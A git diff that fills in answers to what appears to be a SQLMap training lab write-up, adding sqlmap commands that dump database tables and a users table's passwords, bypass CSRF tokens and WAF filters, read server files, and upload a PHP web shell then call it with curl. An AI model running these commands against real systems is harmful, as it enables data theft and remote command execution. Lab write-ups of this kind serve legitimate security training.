@@ -85,20 +85,23 @@ sqlmap 'http://94.237.62.6:47094/case7.php?id=1' --batch --dump -T flag7 --no-ca
 
 >**Q. What's the contents of table flag1 in the testdb database? (Case #1)**
 
-
+```bash
+sqlmap 'http://94.237.62.6:47094/case1.php?id=1' -p id -D testdb --tables
+sqlmap 'http://94.237.62.6:47094/case1.php?id=1' -p id -D testdb -T flag1 --dump
+```
 
 ## Advanced Database Enumeration
 
 >**Q. What's the name of the column containing "style" in it's name? (Case #1)**
 
 ```bash
-
+sqlmap 'http://94.237.62.6:47094/case1.php?id=1' --search -C "style"
 ```
 
 >**Q. What's the Kimberly user's password? (Case #1)**
 
 ```bash
-
+sqlmap 'http://94.237.62.6:47094/case1.php?id=1' --dump -D testdb -T users -C name,password --no-cast
 ```
 
 ## Bypassing Web Application Protections
@@ -106,25 +109,25 @@ sqlmap 'http://94.237.62.6:47094/case7.php?id=1' --batch --dump -T flag7 --no-ca
 >**Q. What's the contents of table flag8? (Case #8)**
 
 ```bash
-
+sqlmap -u "http://94.237.62.6:47094/case8.php" --data="id=1&t0ken=H9AemyR5JmWEZHQhjzVoyE3Q6gc9VMkaezSfg6qIEs" --csrf-token="t0ken" --batch --dump -T flag8
 ```
  
 >**Q. What's the contents of table flag9? (Case #9)**
 
 ```bash
-
+sqlmap -u "http://94.237.62.6:47094/case9.php?id=1&uid=1898023378" --randomize=uid --batch --dump -T flag9
 ```
 
 >**Q. What's the contents of table flag10? (Case #10)**
 
 ```bash
-
+sqlmap -u "http://94.237.62.6:47094/case10.php" --data="id=1" --batch --dump -T flag10 --random-agent
 ```
 
 >**Q. What's the contents of table flag11? (Case #11)**
 
 ```bash
-
+sqlmap -u "http://94.237.62.6:47094/case11.php?id=1" --skip-waf --batch --dump -T flag11 --tamper=between
 ```
 
 ## OS Exploitation
@@ -132,13 +135,24 @@ sqlmap 'http://94.237.62.6:47094/case7.php?id=1' --batch --dump -T flag7 --no-ca
 >**Q. Try to use SQLMap to read the file "/var/www/html/flag.txt".**
 
 ```bash
-
+sqlmap -u "http://94.237.62.37:45885/?id=1" --file-read "/var/www/html/flag.txt"
+cat /home/marcos/.local/share/sqlmap/output/94.237.62.37/files/_var_www_html_flag.txt
 ```
 
 >**Q. Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.**
 
 ```bash
+sudo nano shell.php  
+```
 
+```php
+echo '<?php system($_GET["cmd"]); ?>'
+```
+
+```bash
+sudo chmod +x shell.php
+sqlmap -u "http://94.237.62.37:45885/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+curl http://94.237.62.37:45885/shell.php?cmd=cat+../../../flag.txt
 ```
 
 ## Skills Assessment
@@ -146,5 +160,6 @@ sqlmap 'http://94.237.62.6:47094/case7.php?id=1' --batch --dump -T flag7 --no-ca
 >**Q. What's the contents of table final_flag?**
 
 ```bash
-
+sqlmap -r final.txt --batch --dump --no-cast --tamper=between --dbs
+sqlmap -r final.txt --batch --dump --no-cast --tamper=between --dbs -D production -T final_flag
 ```
